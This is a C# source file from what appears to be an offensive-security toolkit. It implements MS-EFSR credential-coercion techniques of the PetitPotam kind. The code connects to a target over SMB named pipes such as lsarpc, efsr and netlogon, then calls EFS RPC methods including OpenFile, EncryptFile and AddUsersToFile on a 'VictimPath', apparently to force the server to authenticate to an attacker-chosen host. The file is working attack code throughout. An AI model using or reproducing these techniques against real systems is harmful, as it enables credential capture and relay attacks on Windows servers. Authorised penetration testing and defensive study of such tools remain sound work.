using ms_efsr;
using System.ComponentModel;
using System.Net;
using Titanis.Cli;
using Titanis.Msrpc;
using Titanis.Msrpc.Msefsr;
using Titanis.Net;
using Titanis.Security;
using Titanis.Smb2;

namespace Titanis.CredCoerce
{
	/// <summary>
	/// Named pipe to use for EFSR coercion techniques; must match an entry in <see cref="EfsClient.PipeCandidates"/>.
	/// </summary>
	internal enum EfsPipe
	{
		All,
		Efsr,
		Lsarpc,
		Samr,
		Netlogon,
		Lsass,
	}

	/// <summary>
	/// Parameters specific to the EFSR coercion techniques.
	/// </summary>
	internal class EfsCoercionParameters : ParameterGroupBase
	{
		[Parameter]
		[Description("Named pipe to use for EFSR techniques (default: Lsarpc)")]
		[DefaultValue(EfsPipe.Lsarpc)]
		public EfsPipe Pipe { get; set; }
	}

	abstract class EfsCoercionTechnique : CoercionTechnique
	{
		private readonly Func<EfsClient, CoercionContext, CancellationToken, Task> func;

		internal EfsCoercionTechnique()
		{
		}

		// Candidate that last connected successfully; tried first next time
		private static int s_preferred;

		public sealed override async Task Execute(CoercionContext context, CancellationToken cancellationToken)
		{
			var candidates = EfsClient.PipeCandidates;
			var selectedPipe = context.Command.EfsOptions.Pipe;
			if (selectedPipe != EfsPipe.All)
			{
				var pipeName = selectedPipe == EfsPipe.Efsr ? EfsClient.EfsPipeName : selectedPipe.ToString().ToLowerInvariant();
				candidates = new[] { (pipeName, EfsClient.GetUuidForPipe(pipeName)) };
			}
			for (int n = 0; n < candidates.Length; n++)
			{
				int i = (s_preferred + n) % candidates.Length;
				var (pipe, uuid) = candidates[i];
				using var efs = new EfsClient(uuid);
				try
				{
					await context.RpcClient.ConnectPipe(efs, context.SmbClient, new UncPath(context.ServerName, Smb2Client.IpcName, pipe), cancellationToken);
				}
				catch (Exception ex) when (ex is not OperationCanceledException)
				{
					context.Log.WriteVerbose($"EFS over pipe {pipe} failed: {ex.Message}");
					continue;
				}

				s_preferred = i;
				context.Log.WriteVerbose($"Connected to EFS over pipe {pipe}");
				await this.Execute(efs, context, cancellationToken);
				return;
			}

			throw new InvalidOperationException("Unable to connect to EFS over any known pipe");
		}

		protected abstract Task Execute(EfsClient? efs, CoercionContext context, CancellationToken cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.OpenFile")]
	sealed class EfsOpenFileTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.OpenFile(context.VictimPath, cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.EncryptFile")]
	sealed class EfsEncryptFileTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.EncryptFile(context.VictimPath, cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.DecryptFile")]
	sealed class EfsDecryptFileTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.DecryptFile(context.VictimPath, cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.QueryUsersOnFile")]
	sealed class EfsQueryUsersOnFileTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.QueryUsersOnFile(context.VictimPath, cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.QueryRecoveryAgents")]
	sealed class EfsQueryRecoveryAgentsTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.QueryRecoveryAgents(context.VictimPath, cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.RemoveUsersFromFile")]
	sealed class EfsRemoveUsersFromFileTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.RemoveUsersFromFile(context.VictimPath, new EncryptionCertificateHash[0], cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.AddUsersToFile")]
	sealed class EfsAddUsersToFileTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.AddUsersToFile(context.VictimPath, null, cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.FileKeyInfo")]
	sealed class EfsFileKeyInfoTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.GetBasicFileKeyInfo(context.VictimPath, cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.DuplicateEncryptionInfoFile")]
	sealed class EfsDuplicateEncryptionInfoFileTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.DuplicateEncryptionInfoFile(context.VictimPath, context.VictimPath, Winterop.FileAttributes.Normal, true, new Winterop.Security.SecurityDescriptor(Winterop.Security.SecurityDescriptorControl.None, null, null, null, null), cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.AddUsersToFileEx")]
	sealed class EfsAddUsersToFileExTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.AddUsersToFile(context.VictimPath, null, EfsClient.EfsAddUsersOptions.None, cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.FileKeyInfoEx")]
	sealed class EfsFileKeyInfoExTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.GetBasicFileKeyInfo(context.VictimPath, BasicFileKeyFlags.None, cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.GetEncryptedFileMetadata")]
	sealed class EfsGetEncryptedFileMetadataTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.GetEncryptedFileMetadata(context.VictimPath, cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.SetEncryptedFileMetadata")]
	sealed class EfsSetEncryptedFileMetadataTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.SetEncryptedFileMetadata(context.VictimPath, Array.Empty<byte>(), cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.EncryptFileExSrv")]
	sealed class EfsEncryptFileExSrvTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.EncryptFile(context.VictimPath, null, cancellationToken);
	}
}
